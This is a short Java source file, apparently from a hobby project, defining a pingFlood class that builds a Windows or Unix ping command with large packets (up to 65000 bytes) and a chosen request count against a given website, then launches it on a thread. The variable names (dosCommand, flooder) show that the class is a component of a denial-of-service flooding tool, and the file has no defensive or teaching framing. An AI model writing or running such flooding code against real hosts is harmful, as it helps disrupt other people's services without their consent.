


/**
 * Created by ryan on 11/14/14.
 */
public class pingFlood implements Runnable {

    String website;
    String[] dosCommand;//=new String[8];
    int requests, packetSize, secWait;
    ExecuteCommand dos;
    boolean isWindows;
    final int waitTime=10;

            public pingFlood(String website, int requests, int packetSize, int secWait) {
                if(!(secWait<waitTime))  this.secWait=waitTime;
                else this.secWait=secWait;
                this.website=website;
                this.requests=requests;
                if(!(packetSize<65000)) this.packetSize=65000;
               else this.packetSize=packetSize;
                if((isWindows=Startup.isWindows())) {
                    dosCommand=new String[]{"ping","-n", ""+this.requests,"-l", ""+this.packetSize, "-w", ""+this.secWait, website};

                } else {
                    dosCommand=new String[]{"ping","-c", ""+this.requests,"-s", ""+this.packetSize, "-W", ""+this.secWait, website};

                }
                dos=new ExecuteCommand(dosCommand);
            }


        public void run() {
            Thread flooder=new Thread(dos);
            flooder.start();

        }

}

